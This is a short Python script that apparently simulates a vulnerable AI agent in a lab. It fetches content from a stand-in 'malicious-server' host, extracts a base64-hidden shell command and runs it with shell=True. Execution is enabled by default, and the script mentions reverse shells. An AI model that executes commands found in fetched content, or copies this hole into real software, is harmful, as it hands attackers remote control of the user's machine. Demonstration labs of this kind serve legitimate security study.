import os, re, base64, subprocess, time, sys
import urllib.request

def as_bool(v):
    return str(v).strip().lower() in ("1", "true", "t", "yes", "y", "on")

TARGET_URL = os.getenv("TARGET_URL", "http://malicious-server:8000")
EXECUTE = as_bool(os.getenv("EXECUTE_PAYLOAD", "true"))
print(f"[agent] EXECUTE -> {EXECUTE}")
pattern = re.compile(r"\$\(\s*echo\s+([A-Za-z0-9+/=]+)\s*\|\s*base64\s*-d\s*\)")

def http_get(url: str) -> str:
    with urllib.request.urlopen(url, timeout=5) as resp:
        return resp.read().decode("utf-8", errors="replace")

def main():
    print(f"[agent] Target: {TARGET_URL}", flush=True)
    print(f"[agent] EXECUTE_PAYLOAD={EXECUTE}", flush=True)
    time.sleep(2)  # let other containers boot

    try:
        print("[agent] Fetching content…", flush=True)
        body = http_get(TARGET_URL)
        print("[agent] Received content (truncated to 600 chars):", flush=True)
        print("-" * 60, flush=True)
        print(body[:600], flush=True)
        print("-" * 60, flush=True)

        m = pattern.search(body)
        if not m:
            print("[agent] No payload pattern found.", flush=True)
            sys.exit(0)

        b64 = m.group(1)
        decoded = base64.b64decode(b64).decode("utf-8", errors="replace").strip()
        print(f"[agent] Extracted payload (decoded): {decoded!r}", flush=True)

        if EXECUTE:
            print("[agent] Executing payload (simulating vulnerable agent)…", flush=True)
            subprocess.Popen(decoded, shell=True, executable="/bin/sh")
            print("[agent] Payload launched. If reverse shell, check the listener.", flush=True)
        else:
            print("[agent] EXECUTE_PAYLOAD=false — NOT executing payload.", flush=True)

        time.sleep(3600)  # keep alive so you can inspect
    except Exception as e:
        print(f"[agent] Error: {e}", flush=True)
        time.sleep(10)
        sys.exit(1)

if __name__ == "__main__":
    main()
